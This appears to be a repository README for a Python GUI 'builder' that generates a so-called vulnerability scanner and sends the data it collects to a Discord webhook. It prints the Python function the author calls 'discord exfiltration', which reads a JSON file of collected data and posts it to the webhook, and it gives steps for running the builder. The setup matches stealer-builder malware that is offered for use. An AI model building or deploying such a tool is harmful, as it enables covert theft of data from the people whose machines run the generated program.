# Vuln-Testing
A Vulnerability testing Python Builder script that makes the scanner and then sends collected data to a discord webhook. Made by Mitan7. I have another script like this, though no discord, and *actually* personal use. 

# Some Code
This is in python. It imports:
```
import tkinter as tk
from tkinter import messagebox, scrolledtext
import os
import sys
import requests
```
It also uses this discord exfiltration:
```
def send_to_discord(json_file_path):
    try:
        with open(json_file_path, "r") as f:
            data = f.read()

        payload = {
            "content": f"New Malware Vulnerability Report:\n```json\n{data}\n```"
        }

        response = requests.post(WEBHOOK_URL, json=payload)

        if response.status_code == 204 or response.status_code == 200:
            print("Report successfully sent to Discord webhook!")
        else:
            print(f"Failed to send report: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Error sending to Discord: {e}")

send_to_discord(json_path)
```
See? 

# How to use

First of all. Download this repo (*Duh*). Then run `Builder.py` in the `Vuln Builder` folder. It should make a GUI pop up. It is very simple to follow. Even has a simple `test Webhook` button that tests if your webhook actually functions by sending a test message ("`Test message from Builder.py`")
